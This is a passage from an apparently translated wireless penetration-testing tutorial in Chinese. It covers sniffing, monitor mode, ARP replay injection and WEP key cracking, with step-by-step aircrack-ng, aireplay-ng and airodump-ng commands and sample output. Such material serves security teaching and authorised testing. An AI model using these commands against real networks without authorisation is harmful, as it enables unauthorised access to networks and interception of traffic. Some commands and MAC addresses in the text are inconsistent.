# 第三章：攻击完整性控制

在本章中，我们将涵盖以下内容：

+   在无线网络上嗅探

+   使用监视模式和数据包注入

+   执行数据重放

+   破解 WEP

# 介绍

在处理任何类型的网络或信息时，需要解决的基本组成部分之一是完整性。数据的完整性是至关重要的，因为信息的接收者需要确信他们接收和依赖的信息忠实于数据的创建者和发送者的意图。如果数据的完整性和信心丧失，那么数据基本上就变得毫无价值。

如果您在安全领域工作了足够长的时间，您无疑会遇到著名的 CIA 三角，它是**保密性**、**完整性**和**可用性**的简称。简而言之，保密性是指保护信息免受未经授权的访问或披露。可用性是指保持对系统和数据的访问尽可能恒定或接近恒定（通常以正常运行时间来讨论，如 99.999%的正常运行时间）。最后，完整性组件是我们在本章中要讨论的内容。数据的完整性确保信息没有错误、损坏、修改或任何未经授权的第三方所做的事情。

请记住，在处理 CIA 时，提供一个并不意味着你正在解决其他问题。例如，提供完整性控制并不以任何方式意味着信息的保密性，因为这是一种不同类型的控制。事实上，在许多情况下，您可能会为 CIA 的一个方面提供保护，但不会为其他方面提供保护。例如，您可能希望确保您发送的电子邮件可以被所有人阅读，但您可能会对其进行控制，以确保没有人可以更改它，使其看起来像您说了一些您没有说的话。

重要的是要记住，对于任何组织或个人来说，没有魔法子弹或公式来规定这三个组件的完美平衡。您将需要进行风险评估或评估，以确定根据您独特的威胁和漏洞在您的情况下的平衡。

要破坏数据的完整性，攻击者只需找到一种改变或损坏数据的方法，使其受到质疑或无法按原始意图使用。为了执行基于完整性的攻击，恶意方将寻求访问网络（在我们的情况下是无线网络）并影响数据流并以某种方式修改数据。他们如何修改数据将取决于他们的具体目标和意图。

如果恶意方试图使数据变得毫无价值，他们可以重定向它、损坏它，甚至阻止它到达预定目的地。如果恶意方试图以某种方式改变数据以改变过程的结果，他们可能会使用任意数量的旨在改变数据的值或结构以实现其结果的工具。例如，攻击者可能会拦截股票报价并在传递给接收者时更改各种股票的价值，以诱使他们在本来不会买或卖时进行交易。最后，影响网络本身的完整性也可能允许攻击者突破安全性并拦截诸如凭证和其他有价值的信息。

在无线网络中，影响完整性的攻击是广泛而强大的，可以采取多种不同形式，每种形式可以独立使用或结合起来创建更强大的攻击解决方案。无线网络中使用的一些完整性控制机制的例子是：

+   加密：这是保护机密性和完整性的非常有用的控制或对策。在完整性方面，加密和哈希的数据更难受到破坏，因为它们在没有密钥的情况下是无法解密的，或者（就哈希而言）数据的更改将导致其无效化。

+   预共享密钥（PSK）系统：这涉及使用在每台工作站或设备上输入的共同密钥，以使其能够对无线接入点进行身份验证。这种保护通常以非企业 WEP、WPA 或 WPA2 的形式出现。

+   企业认证：这种类型的系统与基于 PSK 的环境工作方式相同，只是密钥管理是通过诸如 RADIUS 等系统进行集中管理的。

这只是可以部署以强制执行完整性的潜在措施的简短清单，然而在无线环境之外还有许多其他可供选择的措施，可以补充或取代上述清单中提到的措施。

一旦获得了网络访问权限并且数据的完整性受到质疑，攻击者可能选择为了任何目的而改变事物。

# 攻击类型

完整性控制攻击有很多种，当由熟练和有经验的人使用时，所有这些攻击都非常有效。本章介绍的攻击方法代表了一些可以在无线网络及其客户端设备上部署的最有效和最受欢迎的方法。

在我们开始探索每一种攻击之前，让我们首先列出本章将涵盖的攻击类型：

+   嗅探

+   数据重播

+   数据包注入

+   信标帧的检测

+   欺骗信标帧

请记住，这些只是可以用来破坏无线网络完整性的攻击类型中的一部分；它们永远不应被视为唯一的攻击类型。

# 无线网络上的嗅探

嗅探是一种用于观察网络上流量的技术，它从发送者到接收者（在许多情况下还会返回）的过程中进行。嗅探允许您捕获实时流量，并通过使用过滤器进行提炼，或者可以捕获并保存到文件以供以后分析和处理。嗅探是一种获取有关网络和其中设备信息的强大技术，这些信息反过来可以作为后续活动的基础。

请注意，我在本段的第一行中将嗅探称为一种观察网络上流动的流量的技术。这是一个重要的细节，我觉得可能有些微妙，需要相应地指出。嗅探本身绝不应被视为用于执行攻击的东西，否则我们会陷入认为这是它的唯一用途的思维定势。事实上，嗅探是一种每天都用于完全善意和有益的方式的技术。网络管理员使用嗅探器来诊断网络问题，优化性能，以及进行许多其他有益的用途。

在本章中，我们只是利用嗅探的能力来捕获网络中的信息，然后根据我们发现的内容采取行动。使用这个工具的善意或恶意取决于我们发现的结果的意图。

# 嗅探是如何工作的？

嗅探通过利用或改变某些条件来实现。嗅探的目标是观察系统执行嗅探时所经过的流量，但在正常操作条件下，任何系统只能看到直接发送给它或来自它的信息。这是有道理的，因为一个必须处理所有流过的信息的系统将因效率低下和性能差而陷入困境 - 更不用说它也会是一个安全风险。

为了查看流经的所有流量，网络适配器需要切换到所谓的混杂模式。要理解混杂模式，首先要了解在正常情况下，网络适配器不会在这种条件下运行。在实践中，运行在非混杂模式下的适配器将过滤掉所有不是针对它的流量，并且只处理那些寄给它的流量。然而，当一个网络适配器切换到混杂模式时，情况就会改变。在混杂模式下，适配器将不再过滤掉不是针对它的流量，并且允许系统上安装的软件（用于处理这些信息）查看所有流量。下图显示了一个处于混杂模式的适配器放置在一个网络上。

![](img/819ea064-c7ae-483e-abee-83dd39062afe.jpg)

进行嗅探的系统设置

在现代网络环境中，几乎每个网络适配器都可以切换到混杂模式，只需要相应的指示即可。然而，在大多数情况下，切换到这种模式对于正常操作来说是完全不必要的，因为设备只需要看到针对它的信息。正是因为这个原因，使用设计用于检测系统中使用此模式的方法是有效的，可以定位可能正在运行未经授权的嗅探活动的系统。请记住，适配器处于混杂模式本身并不是警报的原因，因为网络适配器可能以这种模式运行的合法原因。一个主要的例子是**网络入侵检测系统**（**NIDS**），它们旨在检测并向网络管理员报告可疑的流量或活动的存在。由于它们的本质，这些系统必须以混杂模式运行，以便观察所有流量。

在无线网络中，我们没有混杂模式，但是我们有一些我们在第二章中提到的东西，即监视模式。监视模式具有一些与混杂模式不同的特性。首先，切换到监视模式的适配器可以观察无线网络上传输的数据，而无需首先与其关联。其次，监视模式在大多数情况下阻止适配器传输数据。第三，一个适配器可能被限制在一次只监听一个信道，但这取决于所涉及的设备和驱动程序。

另外需要注意的是：许多包括在智能手机、平板电脑和类似设备中的网络适配器不支持混杂模式，因此必须使用外部适配器才能具备这种能力。

为了观察网络上的所有流量，一旦我们处于混杂模式，我们必须首先能够看到流量。换句话说，如果你不在同一个房间里，就不能窃听对话（不包括窃听设备和 NSA 设备）。在网络中，这意味着你必须在同一个冲突域中。

在传统有线网络中，所有设备都通过集线器连接，它们实际上都在同一个冲突域中。想想集线器的工作方式：发送到集线器上的一个端口的流量会自动发送到集线器上的所有端口。由于任何站点都可以随时发送，碰撞可能会发生，这导致了所谓的冲突域。当存在这种类型的情况时，很容易监听网络上的流量，因为每个站点共享相同的逻辑传输区域。基本上，当观察者和受害者存在，以便彼此看到对方的行动时，嗅探是有效的。

请注意，在现代网络上，使用集线器是不受欢迎的，原因有很多，包括我们在这里讨论的嗅探。在现代网络中，交换机已经完全取代了集线器，以避免这种风险，同时优化网络性能和简化管理。

基本上，对于无线网络来说存在着与之类似的情况，其他设置好的方派可以观察到流量。

要知道，传统有线网络在设计上使用了一种称为**CSMA/CD**的基于冲突的技术，它是**载波监听多路访问** **与** **冲突检测**的缩写。这在实践中意味着，如果两个或更多站点同时传输，它们将引起冲突（可以将其想象为两个人同时说话）。这项技术将检测到冲突，并通过强制两个站点等待随机一段时间来重新传输，并希望避免另一个冲突。冲突是许多网络的正常部分，直到冲突变得过多，这种情况下，网络可以被分割以减少冲突的数量到一个更好的水平。

在无线网络中，使用一种称为**CSMA/CA**或**载波监听多路访问** **与** **冲突避免**的技术。你可能会猜到，这个过程不是检测冲突，而是完全避免冲突。在实践中，这意味着一个站点将检查是否有人在传输，如果没有，它将发送一个信号表示它准备好传输，以防止其他站点发送数据。在这一点上，设备将传输并在传输完成时发出信号，以释放网络。

一些有线网络确实使用 CSMA/CA，但这并不是非常常见的。

进行成功的嗅探的下一个组成部分是以网络嗅探器的形式拥有软件。在 Kali Linux 中，我们有许多旨在做到这一点的工具；其中一些最受欢迎的工具如下：

+   Dsniff：这是一套围绕嗅探主题的工具，每个工具都设计用于非常有效地执行特定类型的嗅探。许多工具都围绕特定的协议或目的而设计。

+   Tcpdump：这是 Linux 中最常用的网络嗅探器/分析器之一。Tcpdump 是一个命令行工具，非常适合显示头部信息。Tcpdump 可以在[www.tcpdump.org](http://www.tcpdump.org/)上找到。

+   EtherApe：这是一个 Linux/UNIX 工具，旨在以图形方式显示系统传入和传出的连接，以更好地可视化网络活动。

+   Wireshark：最广为人知和使用的数据包嗅探器之一。提供了大量功能，都旨在帮助解剖和分析流量。

+   Kismet：我们在第二章中见过这个实用程序，*攻击访问控制*，当时我们进行了战争驾驶。这个实用程序有很多功能，包括数据包嗅探器。

嗅探器是用于捕获和扫描网络上移动流量的实用程序。你会发现嗅探器是你攻击工具中非常有价值的一部分，但它们为什么如此强大呢？使用嗅探器的最大原因之一是捕获和解剖未加密的网络流量，至少在我们的情况下是这样。

嗅探器的成功程度取决于某些网络协议的相对和固有的不安全性。诸如经过验证的 TCP/IP 协议从未考虑过安全性，因此在这方面提供的保护不多。有几种协议容易被嗅探：

+   Telnet/RLOGIN：容易被嗅探的包括用户名和密码在内的按键输入

+   HTTP：旨在以明文发送信息而没有任何保护，因此是嗅探的一个好目标

+   **简单邮件传输协议**（**SMTP**）：在电子邮件传输中常用的协议，它是高效的，但不包括任何防止嗅探的保护

+   **网络新闻传输协议**（**NNTP**）：所有通信，包括密码和数据，都是以明文发送的

+   **邮政办公室协议**（**POP**）：设计用于从服务器检索电子邮件，该协议不包括防止嗅探的保护，因为密码和用户名可以被拦截

+   **文件传输协议**（**FTP**）：设计用于发送和接收文件的协议；所有传输都是以明文发送的

+   **互联网消息访问协议**（**IMAP**）：在功能和缺乏保护方面类似于 SMTP

这里列出的所有协议都以明文形式传输它们的信息，包括密码、用户名、按键和数据。

# 准备工作

要开始，您需要准备好以下物品：

+   能够进入混杂模式的无线网卡

+   已安装 Wireshark 的 Kali Linux

Wireshark 应该作为 Kali Linux 的默认安装的一部分安装，就像以前一样。您不应该安装这个软件包，而是应该能够在 Kali 的应用程序菜单下的嗅探菜单中选择它。

# 如何做...

您可能想养成将嗅探活动保存为 PCAP 文件的习惯。这些文件受许多不同的嗅探工具（以及其他应用程序）支持，以支持保存捕获的网络活动以供以后或进一步分析。由于网络条件可能会变化（有时会发生剧烈变化），您正在观察的情况可能是独特的，您可能希望保存文件以供以后参考和审查。

1.  启动 Wireshark。

1.  从以下屏幕中选择您希望进行嗅探的接口。

![](img/e0cca468-0c7e-4a28-97e5-a4c6b2ae53c4.jpg)

选择嗅探接口屏幕

1.  或者，您可以使用捕获接口并选中与您的无线适配器匹配的接口。

1.  在这里按下开始按钮，Wireshark 将开始捕获流量。开始按钮看起来像鲨鱼鳍。

在这一点上，你应该开始观察在主 Wireshark 窗口中捕获的流量。在这里我们正在观察的级别上，嗅探无线流量和有线流量实际上没有区别。然而，有一些事情你可以做，以进一步嗅探无线，我们将在接下来进行探讨。

# 使用监视模式和数据包注入

我们要介绍到嗅探过程中的下一个项目是一种称为监视模式的模式。监视模式是一种特殊类型的操作，专门限制在无线适配器上。这种模式用于允许无线适配器查看它当前没有关联的无线网络上的流量。这种模式允许我们使用嗅探器在区域内捕获任何无线网络的流量而不受限制。

大多数现代无线适配器都支持监视模式，但并非普遍支持。在 Linux 上，大多数无线适配器可以通过一些命令行配置切换到监视模式。这与您在 Microsoft Windows 平台上可能遇到的情况不同，那里监视模式通常只能通过使用 AirPcap 等外部适配器来使用。

此外，重要的是要确保不要混淆监视模式和混杂模式，因为它们并不相同。混杂模式在有线和无线网络上都可用，允许查看流经嗅探机器的所有流量，无论是否涉及它们。监视模式专用于无线，允许查看您当前没有关联的无线网络上的流量。它们非常相似，但并不相同。

# 准备工作

要开始，您需要准备好以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux 安装了 Wireshark

# 如何做...

在这个教程中，我们将把一个网络卡切换到监视模式，以便观察来自非关联接入点的流量。

为了将网络适配器切换到监视模式，我们可以使用`ifconfig`来识别无线适配器（如果您还不知道它的名称）。如果您知道名称，然后执行以下步骤。

1.  打开一个终端窗口。

1.  输入以下命令：

```
 ifconfig <adapter name> down
```

1.  按*Enter*键，这将使网络适配器脱机。

1.  输入以下命令：

```
 iwconfig <adapter name> mode monitor
```

1.  按*Enter*键，将网卡切换到监视模式。

1.  输入以下命令：

```
 ifconfig <adapter name> up
```

1.  按*Enter*键，将网络适配器重新联机。

1.  这些命令将把无线网卡置于监视模式。

1.  为了利用网卡处于监视模式，我们可以发出以下命令：

```
 airodump-ng <adapter name> 
```

将网卡置于监视模式非常重要，因为它允许我们进行后续步骤并成功执行它们。在正常情况下，无线适配器必须与无线接入点关联才能像有线网络上的嗅探器一样查看和观察流量。要执行与接入点不关联的攻击，我们将使用监视模式。监视模式将允许我们查看与无线网络或接入点相关的流量，而实际上并不与它关联。事实上，在本书中我们将多次使用监视模式来执行任务，比如在 web 和 WPA 中恢复密钥，以及其他任务。

启用监视模式的确切过程将因使用的无线网卡和相关驱动程序的不同而有所不同。为了确定您当前使用的驱动程序，您可以简单地运行以下命令。

```
airmon-ng 
```

在安装了 Ralink、Atheros 和 Broadcom 无线网卡的机器上，系统的响应如下：

![](img/ae60705b-405d-4429-9ee7-97587aeb6743.png)

我们将逻辑上使用的下一个工具是一个名为`airodump-ng`的工具；这个工具使我们能够根据需要捕获数据包。事实上，这个工具非常重要，我们以后在对无线网络执行密码和密钥破解时将使用它。

我们通过输入`airodump-ng`命令和重命名的监视接口（`mon0`）来激活这个工具，如下所示：

```
airodump-ng mon0 
```

`airodump-ng`命令显示了范围内所有接入点的 BSSID（MAC 地址）、它们的功率、信标帧的数量、数据包的数量、信道、速度、加密方法、使用的密码类型、使用的认证方法和 ESSID。

# 执行数据重放

现在让我们通过执行一个称为重放或数据重放的后续攻击来提高攻击强度。顾名思义，从网络中捕获的信息被存储，然后播放回被定向的网络设备。然而，如果收集到了正确的信息并且在防御方面几乎没有采取保护措施，这种攻击可能会更加危险。

在受害者登录过程中捕获的登录凭据等信息可以简单地在服务器或其他资源上重放并获得访问权限。在使用未加密协议的环境中，这将非常有效。

在这个教程中，我们将使用**地址解析协议**（**ARP**）执行重放攻击，但这种攻击可以修改以执行其他协议和操作。然而，在我们深入讨论之前，让我们先谈一谈 ARP 和我们正在做的事情。

ARP 在网络上用于多种目的，但最常见的用途与在网络上定位系统有关。该协议在**开放系统互连**（**OSI**）模型的第 2 层和第 3 层上运行。在实践中，第 2 层是交换机所在和功能的级别，也是 MAC 地址定义的地方。MAC 地址是一种 ID，通常由制造商分配，并且可以通过软件设置（特别是`ifconfig`实用程序）进行更改。

在子网上，IP 地址不是用于识别希望通信的机器的主要机制；这是 MAC 地址的功能。

如果我们考虑单个子网，并且考虑在该子网上尝试通信的两个主机，那么现在将使用 MAC 地址而不是 IP 地址。只有在需要在不同的子网或网络之间路由流量的情况下才会使用 IP 地址。在本地子网上，MAC 是将流量从一点传输到另一点的主要机制。

在正常操作下，系统将保留 ARP 查找表或缓存，其中存储有关哪些 IP 地址与哪些 MAC 地址相关联的信息。当尝试发送数据（例如数据包）到子网上的另一个主机时，发送方将查看其目的 IP 地址，一旦发现其位于相同的子网上，就会发送 ARP 广播。此广播将在子网上发送出去，并且实质上将询问该子网上的其他客户端谁拥有特定的 IP 地址，并要求该主机返回其 MAC 地址。

值得注意的是，如果主机先前已经在同一子网上与另一个主机通信过，那么 IP 地址和 MAC 地址的关联将已经存储在本地系统的缓存中，这也称为 ARP 表。

# 准备就绪

要开始，您需要准备以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

这里列出的物品是基本要求，如果需要，您可以轻松使用更多（或不同）组件。例如，如果您想要增强范围，可以使用具有连接到外部天线的 USB 无线网卡，以获得更好的接收。您还可以使用不同的无线应用程序来完成此任务，但是由于 Kismet 非常受欢迎，因此我们将在本文中使用它。

在本文中，我们将使用`aircrack-ng`套件中的一组工具，该套件本身包括我们将在其他章节中遇到的许多不同的工具。我们将使用的工具包括：

+   `airodump-ng`：这用于嗅探网络上流动的流量。

+   `aireplay-ng`：用于生成流量以破解共享密钥或引起去认证情况，稍后我们将看到。有一些选项可以引起去认证，以捕获 WPA 握手数据，伪造认证，交互式数据包重放，手工 ARP 请求注入和 ARP 请求重注入。

# 操作步骤...

首先，打开一个控制台使用`airodump-ng`开始嗅探流量。`aireplay-ng`和`airodump-ng`将同时运行，但在不同的控制台中。

要启动`airodump`，请使用以下命令：

```
airodump-ng <wireless interface name)
```

按*Enter*，可能需要一些时间，但等待目标网络出现在列表中；以下是示例：

![](img/49e6003e-66af-448f-bc37-1d955e2e7fac.png)

请注意第一列中显示的 MAC 地址。

一旦您的目标出现，您可以开始`aireplay`。在第二个控制台中，输入以下内容：

```
aireplay-ng --arpreplay -b <target BSSID> -h <MAC address of connected client> <interface name> 
```

`-b`指定目标 BSSID，`-h`指定连接的客户端的 MAC。

1.  现在您必须等待 ARP 数据包到达。通常您需要等待几分钟。一旦成功，您将看到类似以下内容：

```
 Saving ARP requests in replay_arp-1001.cap 
```

1.  您还必须启动`airodump`来捕获回复：

```
 Read 2493 packets (got 1 ARP requests), sent 1305 packets...
```

1.  下一步是重用保存在文件中的捕获的 ARP 数据包。您会注意到它说 ARP 请求被保存在`replay_arp-1001.cap`中。因此，我们不必等待新的 ARP，只需使用`-r`参数重用旧的 ARP：

```
 aireplay-ng -2 -r replay_arp-1001.cap ath0                        
```

1.  系统的响应是：

```
 Size: 86, FromDS: 0, ToDS: 1 (WEP) 

           BSSID  =  00:14:6C:7E:40:80 
       Dest. MAC  =  FF:FF:FF:FF:FF:FF 
      Source MAC  =  00:0F:B5:88:AC:82 

      0x0000:  0841 0000 0014 6c7e 4080 000f b588 ac82  .A....l~@....... 
      0x0010:  ffff ffff ffff 7092 e627 0000 7238 937c  ......p..'..r8.| 
      0x0020:  8011 36c6 2b2c a79b 08f8 0c7e f436 14f7  ..6.+,.....~.6.. 
      0x0030:  8078 a08e 207c 17c6 43e3 fe8f 1a46 4981  .x.. |..C....FI. 
      0x0040:  947c 1930 742a c85f 2699 dabe 1368 df39  .|.0t*._&....h.9 
      0x0050:  ca97 0d9e 4731                           ....G1 

      Use this packet ? y 
      You say "y" and then your system will start injecting: 

      Saving chosen packet in replay_src-0219-123117.cap 
      You should also start airodump-ng to capture replies. 

      Sent 3181 packets... 
```

# 破解 WEP

无线网络与其他网络的一个独特特点当然是它们不使用传统媒体，而是使用无线电波将信息从一个点传输到另一个点。这就是使得这些网络如此吸引人和受欢迎的原因，一个人可以在无线网络的范围内随时随地携带设备，并且无需担心电缆等，仍然可以保持访问。然而，这种优势是有代价的，即无线电信号是不加区分的，任何能够接收它们的人也能够处理它们携带的信息。

幸运的是，无线网络的设计者将这视为一个问题，并决定在 IEEE 802.11b 网络设计的初始规范中构建**有线等效隐私**（**WEP**）的保护措施。在发布时，WEP 被视为一个很好的功能，但不久之后问题就出现了，随后不断恶化。

WEP 是可用加密协议中最古老且可能是最薄弱的。WEP 标准最初被引入作为无线安全的初始解决方案，但很快就发现存在缺陷和高度脆弱。

WPA，或 Wi-Fi 保护访问，是 WEP 的继任者，旨在解决困扰 WEP 的许多问题。在许多方面它取得了成功，并成为了一个更加严格的安全协议。WPA 使用 TKIP、MIC 和 AES 加密作为其保护信息的主要机制。

WPA2 是 WPA 的升级或继任者，旨在解决和取代 WPA 的问题。WPA2 更加强大，使用更严格的 AES 和 CCMP 加密。该标准还有一个版本，使用更强大的系统，如 EAP、TKIP 和 AES（带有更长的密钥）。

然而，在讨论问题之前，让我们看看 WEP 应该如何工作，然后再看看如何利用它的问题。

WEP 是无线加密协议中最古老的，最初引入并集成到 802.11b 标准中时，它被视为一种提供数据传输安全性的方式，与有线网络的安全性差不多。按设计，WEP 协议利用了一些现有技术，包括 RC4 加密协议。

设计和推出时，它的目的是实现以下目标：

+   防止窃听通信并尝试减少未经授权的数据披露

+   检查数据在网络中传输时的完整性

+   使用共享的秘密密钥对数据包进行加密，然后再传输

+   在轻量、高效的系统中提供机密性、访问控制和完整性

它的问题源于以下情况：

+   该协议设计时没有经验丰富的密码学家、学术界或公众的审查。

+   它没有明确定义的密钥分发方法（如集中式密钥管理），除了预共享密钥，必须手动输入到每个站点。因此，密钥在大规模上很难更改；因此，很少更改。

+   它的设计使得可以通过嗅探工具和操作系统中免费提供的破解工具 passively uncover the key。

+   不同供应商使用的密钥生成器设计不一致且设计不良，导致存在 40 位密钥使用问题等漏洞。

+   用于执行密钥调度的算法已被证明容易受到攻击。

+   完整性检查中使用的 CRC32 存在缺陷，稍加修改即可使攻击者一致地修改数据包以产生他们期望的结果。

+   **初始化向量**（**IVs**）只有 24 位长度，这意味着一个轻度活跃的网络可以在五个小时或更短的时间内耗尽整个 IV 池。

+   它容易受到已知明文攻击，通过分析数据包。

+   可以通过分析数据包来发现密钥，从而创建解密表。

+   它容易受到拒绝服务攻击，通过使用未经 WEP 认证的关联和取消关联消息。

# 准备就绪

要开始，您需要准备好以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果需要，您可以轻松地使用更多（或不同的）组件。例如，如果您想要增强范围，您可以使用一个带有外部天线连接的基于 USB 的无线网卡，这样可以获得更好的接收效果。

# 如何做...

为了破解运行该协议的接入点的 WEP 密钥，需要进行一个过程，其中需要收集所谓的**初始化向量**（**IVs**）。这个过程的问题在于，在正常情况下，网络在短时间内不会生成大量这些项目。在正常情况下，这意味着我们需要等待很长一段时间才能获得足够的 IVs 来检索网络密钥。然而，我们可以利用我们之前的配方的信息以及一些新的技能来加快这个过程，以检索密钥。简而言之，我们将向网络注入数据包，以便让 AP 在更短的时间内生成大量数据包，这意味着捕获具有弱 IVs 的数据包的能力增加了。

完成这个过程后，我们可以使用捕获的流量来检索密钥。

简而言之，在这个配方中，我们将要看到的步骤如下：

1.  在特定的 AP 频道上启动无线接口的监视模式。

1.  测试无线设备对 AP 的注入能力。

1.  使用`aireplay-ng`与接入点进行伪身份验证。

1.  在一个带有`bssid`过滤器的 AP 频道上启动`airodump-ng`以收集新的唯一 IVs。

1.  启动`aireplay-ng`以 ARP 请求重播模式注入数据包。

1.  运行`aircrack-ng`来使用收集的 IVs 破解密钥。

# 第一阶段-配置监视器模式

我们破解 WEP 的第一步是将我们的卡切换到监视模式，就像我们之前做的那样。我们需要这样做，以便让网络接口检测到附近网络发送的每个数据包。要在名为`wlan0`的网络接口上执行此操作：

1.  `airodump-ng`启动`wlan0 9`（`9`将锁定卡以监听通道`9`，但这可以更改为您希望观察的接入点的通道。您可以通过运行不带通道指示器的命令来发现您希望目标的接入点的通道）。

1.  按*Enter*。

```
 The system will respond: 

     Interface       Chipset         Driver 

     Wlan0           Atheros         madwifi-ng 
     ath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode 
     enabled) 
```

您会注意到上面报告`ath0`已被设置为监视模式。要确认接口已正确设置，请输入`iwconfig`。

系统会回应：

```
 lo        no wireless extensions. 

 Wlan0     no wireless extensions. 

 eth0      no wireless extensions. 

 ath0      IEEE 802.11g  ESSID:""  Nickname:"" 
        Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82    
        Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3   
        Retry:off   RTS thr:off   Fragment thr:off 
        Encryption key:off 
        Power Management:off 
        Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm 
        Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0 
        Tx excessive retries:0  Invalid misc:0   Missed beacon:0 
```

在上面的响应中，您可以看到`ath0`处于`2.452 GHz`频率的监视模式，这是通道 9，接入点显示了您无线网卡的 MAC 地址。在继续之前确认适配器的配置是很重要的，以避免以后出现问题。不正确的配置可能导致破解过程无法正常工作或根本无法工作。

# 第二阶段-数据包注入

为了确保我们能够正确地攻击网络，我们需要确保我们足够靠近以执行数据包注入。为了验证这一点，我们将运行以下命令：

```
aireplay-ng -9 -e ganon -a 00:28:6C:E4:40:80 wlan0
```

+   `-e ganon`：这是无线网络名称

+   `-a 00:28:6C:E4:40:80`：这是接入点的 MAC 地址

系统应该会回应：

```
 09:23:35  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9 
 09:23:35  Trying broadcast probe requests... 
 09:23:35  Injection is working! 
 09:23:37  Found 1 AP  

 09:23:37  Trying directed probe requests... 
 09:23:37  00:28:6C:E4:40:80  - channel: 9 - 'ganon' 
 09:23:39  Ping (min/avg/max): 1.827ms/68.145ms/111.610ms Power: 33.73 
 09:23:39  30/30: 100% 
```

最后一行很重要，因为我们正在寻找一个接近`100%`的值；如果这个值很低，这表明你离接入点太远或者信号不好。如果是这种情况，请尝试改变位置。

# 第三阶段 - 捕获 IVs

现在我们已经走到这一步，我们需要让它开始捕获这些有价值的 IVs。我们通过使用`airodump`来帮助我们捕获这些宝贵的信息。

打开第二个控制台会话，并保持之前的会话打开以捕获生成的 IVs。然后，输入：

```
airodump-ng -c 9 --bssid 00:28:6C:E4:40:80 -w output wlan0 
--bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminate extraneous traffic. 
-w capture is file name prefix for the file which will contain the IVs. 
```

当注入正在进行时，屏幕会看起来类似于这样：

```
 CH  9 ][ Elapsed: 8 mins ][ 2007-03-21 19:25  

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID 

 00:14:6C:7E:40:80   42 100     5240   178307  338   9  54  WEP  WEP         teddy                            

 BSSID              STATION            PWR  Lost  Packets  Probes                                              

 00:14:6C:7E:40:80  00:0F:B5:88:AC:82   42     0   183782 
```

# 第四阶段 - 执行伪身份验证

我们使这个过程工作的下一步是与接入点进行身份验证。这很重要，因为如果我们在没有关联并且接入点存在的情况下执行数据包注入，该过程将失败并且连接将被拒绝。事实上，如果被注入的源 MAC 地址没有关联，目标 API 将忽略数据包并发送一个明文的去认证数据包来拒绝连接尝试。当这种情况发生时，因为 AP 正在忽略所有被注入的数据包，不会创建新的 IVs。

你用于注入的 MAC 必须通过伪身份验证或使用已关联客户端的 MAC 与 AP 关联。

为了将客户端与接入点关联，我们将使用伪身份验证：

```
aireplay-ng -1 0 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0
```

+   `-1`表示伪身份验证

+   `0`重新关联时间（秒）

+   -e ganon 是无线网络名称

+   `-a 00:14:6C:7E:40:80`是接入点 MAC 地址

+   `-h 00:0F:B5:88:AC:82`是我们的卡 MAC 地址

成功看起来像：

```
18:18:20  Sending Authentication Request 
18:18:20  Authentication successful 
18:18:20  Sending Association Request 
18:18:20  Association successful :-) 
```

或者对于挑剔的接入点的另一个变化：

```
aireplay-ng -1 6000 -o 1 -q 10 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0
```

+   `6000`：每`6000`秒重新认证一次。长时间间隔也会导致保持活动数据包被发送。

+   `-o 1`：一次只发送一组数据包。默认是多个，这会让一些 APs 感到困惑。

+   `-q 10`：每`10`秒发送一次活动数据包。

成功看起来像：

```
18:22:32  Sending Authentication Request 
18:22:32  Authentication successful 
18:22:32  Sending Association Request 
18:22:32  Association successful :-) 
18:22:42  Sending keep-alive packet 
18:22:52  Sending keep-alive packet 
# and so on. 
```

然而，如果身份验证失败，将会得到以下结果：

```
18:28:02  Sending Authentication Request 
18:28:02  Authentication successful 
18:28:02  Sending Association Request 
18:28:02  Association successful :-) 
18:28:02  Got a deauthentication packet! 
18:28:05  Sending Authentication Request 
18:28:05  Authentication successful 
18:28:05  Sending Association Request 
18:28:10  Sending Authentication Request 
18:28:10  Authentication successful 
18:28:10  Sending Association Request 
```

请注意，在这个例子中，出现了一个`收到去认证数据包`的消息，然后是一系列的重试。如果发生这种情况，这意味着你无法成功继续，你必须再试一次，看看是否能够成功关联。

# 第五阶段 - ARP 重放模式

回顾之前的方法，我们将使用`aireplay-ng`来监听 ARP 请求，然后使用这些捕获的信息重新注入到网络中。在这种情况下，我们主要使用 ARP 请求数据包，主要是因为 AP 将重新广播它们，从而生成一个新的 IV。由于这是我们的主要目标，即在短时间内获得大量 IVs，我们正在进行这个操作。

要执行注入，我们需要打开另一个控制台并输入：

```
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0
```

这将开始监听 ARP 请求，当它听到一个时，`aireplay-ng`将立即开始注入它。

如果进程成功完成，期望看到类似以下的输出：

```
 Saving ARP requests in replay_arp-2017.cap 
 You should also start airodump-ng to capture replies. 
 Read 629399 packets (got 316283 ARP requests), sent 210955 packets... 
```

你可以通过检查你的`airodump-ng`屏幕来确认你正在进行注入。数据包应该迅速增加。`#/s`应该是一个不错的数字。然而，不错取决于许多因素。典型的范围是每秒`300`到`400`个数据包。它可以低至每秒 100 个，高至每秒 500 个。

# 第六阶段 - 获取 WEP 密钥

现在我们已经将流量捕获到一个`.cap`文件中，我们现在将尝试从捕获的数据包中检索密钥。为此，我们需要执行以下操作：

打开另一个新的控制台会话并输入：

```
aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
```

-b 00:14:6C:7E:40:80 选择我们感兴趣的一个接入点。

`.cap`选择所有以 output 开头并以`.cap`结尾的文件。

1.  您可以在生成数据包的同时运行此操作。在短时间内，WEP 密钥将被计算并呈现出来。对于 64 位密钥，您大约需要 250,000 个 IVs，对于 128 位密钥，您需要 1,500,000 个 IVs。请注意，这些值只是粗略指南，其他变量可能会影响您实际需要收集多少流量和 IVs。

1.  如果过程成功完成，您应该会看到类似以下内容的东西：

```
 Aircrack-ng 0.9 

                              [00:03:06] Tested 674449 keys (got 96610 IVs) 

 KB    depth   byte(vote) 
